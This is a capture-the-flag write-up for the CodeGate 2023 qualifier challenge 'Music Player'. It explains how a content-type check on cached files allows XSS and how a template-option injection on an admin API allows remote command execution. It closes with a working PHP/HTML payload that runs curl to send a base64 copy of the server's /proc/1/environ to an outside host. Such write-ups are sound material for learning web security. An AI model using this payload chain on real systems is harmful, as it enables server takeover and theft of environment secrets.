# CodeGate 2023 Quals

* https://gen.codegate2023.org/
* https://uni.codegate2023.org/

## CODEGATE Music Player

### Description

- Challenge URL: http://3.36.93.133/
- Challenge File: None

Last year, Finalists were involved to put their favorite songs on the playlist to avoid from playing the organizer's loud weeb songs on-site.

This year, we decided to provide some good music for the qualification round as well. Good luck solving CTF challenges!

### Solves

* General Division: 30 solves
* University Division: 5 solves

### Solution

1. Send inquiry to malicious audio-like file. `url = f'http://3.36.93.133/api/inquiry?url=http%3A%2F%2Fnginx%2Fapi%2Fstream%2Fhttp%253A%252F%252F(url)p3&checksum={checksum}'`

2. When inquiry is sent to add songs, content type of the content is compared and checked. However, when cached, the cached file auto-resolves the content-type by the browser. Therefore XSS is possible

3. When XSS is possible, admin API can be accessed where JS template RCE can be triggered to run system commands.

```php
<?php
header("Content-Type: audio/mp3");
?>
<!doctype html>
<script>
    data = {
        "id": {
            "settings": {
                "view options": {
                    "client": "true",
                    "escapeFunction": "1;return global.process.mainModule.constructor._load('child_process').execSync('curl http://a.com:1234/$(cat /proc/1/environ | base64 --wrap=0)');",
                }
            }
        }
    }
    fetch("http://nginx/api/messages", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(data)
    })
    .then(r=>{r.text()})
    .then(r=>{
        console.log(r);
    })
</script>
```
